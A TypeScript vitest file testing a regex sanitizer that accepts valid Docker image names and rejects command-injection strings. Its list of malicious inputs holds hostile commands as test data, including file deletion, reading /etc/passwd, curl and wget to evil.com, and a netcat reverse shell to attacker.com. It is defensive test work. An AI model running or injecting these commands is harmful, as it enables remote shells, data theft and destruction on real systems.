// Security tests for Docker image name sanitization

import { describe, it, expect } from 'vitest';

// Replicate the sanitizer regex for testing
const SAFE_IMAGE_NAME_REGEX = /^[a-zA-Z0-9][a-zA-Z0-9._/-]*[a-zA-Z0-9]?(:[a-zA-Z0-9][a-zA-Z0-9._-]*)?$/;

function sanitizeImageName(image: string): string {
  const trimmed = image.trim();
  if (!trimmed) {
    throw new Error('Image name must not be empty');
  }
  if (!SAFE_IMAGE_NAME_REGEX.test(trimmed)) {
    throw new Error(
      `Invalid Docker image name: "${trimmed.slice(0, 100)}" contains forbidden characters`
    );
  }
  return trimmed;
}

describe('Docker Image Name Sanitization', () => {
  describe('Valid Image Names', () => {
    const validImages = [
      'node:22-alpine',
      'node:22',
      'node',
      'ubuntu:latest',
      'alpine:3.19',
      'python:3.12-slim',
      'nginx:1.25',
      'registry.example.com/my-image:v1.0.0',
      'my-registry.io/team/project:latest',
      'docker.io/library/redis:7.2',
      'postgres:16.2-alpine',
      'node',
      'golang:1.22',
    ];

    for (const image of validImages) {
      it(`accepts: "${image}"`, () => {
        expect(sanitizeImageName(image)).toBe(image);
      });
    }
  });

  describe('Rejects Injection Attempts', () => {
    const maliciousInputs = [
      'node:22; curl evil.com',
      'alpine && rm -rf /',
      'nginx | cat /etc/passwd',
      'redis $(curl evil.com)',
      'postgres `id`',
      'mysql; wget evil.com',
      'node:22\ncurl evil.com',
      'node:22\rwhoami',
      "' OR '1'='1",
      'image; shutdown -h now',
      'alpine || true',
      'ubuntu & nc -e /bin/sh attacker.com 4444',
    ];

    for (const input of maliciousInputs) {
      it(`rejects injection: "${input.slice(0, 40)}"`, () => {
        expect(() => sanitizeImageName(input)).toThrow(/invalid docker image name/i);
      });
    }
  });

  describe('Rejects Empty Names', () => {
    it('rejects empty string', () => {
      expect(() => sanitizeImageName('')).toThrow(/must not be empty/i);
    });

    it('rejects whitespace-only', () => {
      expect(() => sanitizeImageName('   ')).toThrow(/must not be empty/i);
    });
  });
});
